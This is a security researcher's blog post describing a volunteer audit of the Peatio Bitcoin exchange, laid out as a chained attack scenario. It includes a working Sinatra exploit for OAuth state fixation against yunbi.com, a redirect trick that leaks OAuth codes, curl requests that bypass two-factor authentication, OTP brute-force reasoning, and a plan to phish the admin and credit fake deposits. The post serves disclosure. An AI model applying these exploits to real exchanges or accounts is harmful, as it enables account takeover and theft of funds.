---
layout: post
title:  "Hacking a Bitcoin Exchange"
author: "Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)"
---

UPDATE: Once again - no one was hacked in reality and the audit was conducted for free. This post is simply an attack scenario. [You can download the final report and see clarifications here.](https://sakurity.com/blog/2015/01/22/peatio-audit.html)

For a while we've been looking for a project to conduct volunteer security audit. Recently we found a perfect suit for us - [an open source crypto currency exchange Peatio](https://www.peat.io/) powered by Rails.

We dedicated 8 hours to find a way to do the worst you can do with a Bitcoin exchange - steal the hot wallet. The mission was partially accomplished and we found an interesting chain of critical vulnerabilities.

## Step 1. Hijacking the account

![](https://sakurity.com/img/weibo.png)

Peatio has "Connect Weibo account" feature built-in. According to [OAuth Security Cheatsheet](https://oauthsecurity.com), poorly implemented OAuth is a reliable way to take over an account.

##### Connecting attacker’s weibo account to the victim's Peatio account

[omniauth-weibo-oauth2](https://github.com/beenhero/omniauth-weibo-oauth2/pull/12) gem was vulnerable to state fixation. We can set state to arbitrary value (e.g. 123) and apply the attacker’s code instead along with state=123, which will lead to assigning attacker's weibo  to victim's peatio account. The exact same issue was in [omniauth-facebook gem](https://github.com/mkdynamic/omniauth-facebook/wiki/CSRF-vulnerability:-CVE-2013-4562) and [others omniauth-based libraries](https://github.com/search?q=support+omniauth-oauth2+auto+csrf+protection&ref=searchresults&type=Code&utf8=%E2%9C%93) copypasting same vulnerable code. It's funny that the comment above says **"to support omniauth-oauth2's auto csrf protection"** but does the opposite and [switches it off](/img/codecomments.png).

The bug can be exploited with following Sinatra app, just add YourWeiboCookies:

{%highlight ruby%}
require 'sinatra'
get '/get_weibo_cb' do

  conn = Faraday.new(:url => 'https://api.weibo.com')
  new_url = conn.get do |r|
    r.url "/oauth2/authorize?client_id=456519107&redirect_uri=https%3A%2F%2Fyunbi.com%2Fauth%2Fweibo%2Fcallback&response_type=code&state=123"

    r.headers['Cookie'] =<<COOKIE
YourWeiboCookies
COOKIE

    r.options.timeout = 4        
    r.options.open_timeout = 2
  end.headers["Location"]
  redirect new_url
end

get '/peatio_demo' do
  response.headers['Content-Security-Policy'] = "img-src 'self' https://yunbi.com"
  "<img src='https://yunbi.com/auth/weibo?state=123'><img src='/get_weibo_cb'>"
end
{%endhighlight%}




##### What if the user already has Weibo connected?

The system is not going to connect another Weibo account but we wanted the exploit to work seamlessly for every possible victim. So we hacked Weibo's OAuth.

First, we found out Weibo doesn't whitelist `redirect_uri` like [Github didn't](https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html). It's possible to change `redirect_uri` to another page on the victim domain to leak the `code` in the Referrer header and then use it to log in victim's account.

However there was no such page on Peatio to make it leak. No external images, links or anything. The attack surface was so tiny. But then we found this in `DocumentsController`:

    if not @doc
      redirect_to(request.referer || root_path)
      return
    end

Following chain of redirects leaks the code by putting it in the `#` fragment first. 

1. `attacker_page` redirects to `weibo.com/authorize?...redirect_uri=https://app/documents/not_existing_doc%23...`
2. Weibo doesn't properly parse `redirect_uri` and redirects the victim to `https://app/documents/not_existing_doc#?code=VALID_CODE`
3. Peatio cannot find `not_existing_doc` and sends back Location header equal request.referer which is still attacker_page (the browser retains this header while gets redirected)
4. The browser preserves `#?code=VALID_CODE` fragment and loads `attacker_page#?code=VALID_CODE`. Now the code can be leaked with JS via `location.hash` variable. The code can be used against `https://app/auth/weibo/callback` to log in the victim's account.

So using two bugs above we can hijack any peatio account and only last one requires JS.

## Step 2: Bypassing 2 Factor Authentication



##### For users with Google Authenticator activated

![](https://sakurity.com/img/ga.png)


There’s a gaping hole in SmsAuthsController - `two_factor_required!` is only called for `show` action, but not for `update` which is actually responsible for activating SMS 2FA.

    before_action :auth_member!
    before_action :find_sms_auth
    before_action :activated?
    before_action :two_factor_required!, only: [:show]

    def show
      @phone_number = Phonelib.parse(current_user.phone_number).national
    end

    def update
      if params[:commit] == 'send_code'
        send_code_phase
      else
        verify_code_phase
      end
    end

We can activate new SMS authenticator simply sending following requests straight to `update` action.
    
curl 'https://app/verify/sms_auth' -H 'X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI=' 
-H 'Cookie:_peatio_session=SID’ 
--data '_method=patch&sms_auth%5Bcountry%5D=DE&sms_auth%5B
phone_number%5D=9123222211&commit=send_code'

![](https://sakurity.com/img/success.png)

curl 'https://app/verify/sms_auth' -H 'X-CSRF-Token:ZPwrQuLJ3x7md3wolrCTE6HItxkwOiUNHlekDPRDkwI='
-H 'Cookie:_peatio_session=SID’ --data '_method=patch&sms_auth%5Bcountry%5D=DE&sms_auth%5B
phone_number%5D=9123222211&sms_auth%5Botp%5D=CODE_WE_RECEIVED'

![](https://sakurity.com/img/verified.png)

##### For users with both Authenticator and SMS 

![](https://sakurity.com/img/both.png)


Peatio doesn’t store failed attempts for OTP so it’s very easy to bruteforce both App and SMS OTPs, it will take less than 3 days. For more details check our [OTP Bruteforce Calculator](https://sakurity.com/otp)

![](https://sakurity.com/img/brute.png)


##### For users with SMS 2FA only

`two_factor_by_type` method doesn’t use `activated` scope so even inactive 2FA models can be used. Thus we are not going to brute SMS auth because the victim will start receiving suspicious SMS. We still can bruteforce Google Authenticator because it has seed generated and `verify?` method is working fine.

    def two_factor_by_type
      current_user.two_factors.by_type(params[:id])
    end

##### Furthermore, SMS 2FA has two more issues

    def gen_code
      self.otp_secret = OTP_LENGTH.times.map{ Random.rand(9) + 1 }.join
      self.refreshed_at = Time.now
    end

First issue is `Random.rand` is based on PRNG (Mersenne Twister) which is easily predictable once you have enough subsequently generated numbers. 

Second issue is `rand(9)` can only generate numbers from 0 to 8 so total number of combinations will be 9^6=531441 almost twice less than 1,000,000 and twice easier to bruteforce than App 2FA.


With tricks outlined above we can bypass 2FA for any user. In worst case scenario it takes less than 3 days. If the victim has only Google Authenticator it takes less than 5 seconds to set up new SMS authenticator.

## Step 3: Attacking the admin

Alright, we can hijack the account and bypass 2FA for any user, so we can steal the Bitcoins from anyone who visits our page. Still we need a lot of users to trick into clicking our phishy links. Let's focus on just one of them - the admin.

The simplest way to make the admin visit our link is to create a support ticket with something like "What is wrong with my account can you please check? https://i.will.hack.you/now". Then we hack 2FA to get into the `/admin` panel:

![](https://sakurity.com/img/admin.png)

Unfortunately, this is the worst part. The admin of Peatio can do just few more things  than a regular user. Nothing like "Send all the coins to this bad guy" or "Show API keys of all users". 

      can :update, Proof
      can :manage, Document
      can :manage, Member
      can :manage, Ticket
      can :manage, IdDocument
      can :manage, TwoFactor
      can :menu, Deposit
      can :manage, Deposit
      can :manage, ::Deposits::Bank
      can :manage, ::Deposits::Satoshi
      can :menu, Withdraw
      can :manage, ::Withdraws::Bank
      can :manage, ::Withdraws::Satoshi

The only thing we found is creating a fiat deposit of like 99999999 Chinese Yuan and then accepting it by an admin.

![](https://sakurity.com/img/yuan.png)

Then we can buy all available Bitcoins and altcoins to withdraw them. However not all Bitcoins are on orders. Doing it in stealth mode for a week can bring better results than closing all the orders in rush mode. 

Yunbi assets: [1636 BTC in total and ~350 in the hot wallet](https://yunbi.com/exchange_assets)

Our bounty: 1 BTC. It wasn't about money though.

Finally, the report is [available to download](https://sakurity.com/peatio.pdf).
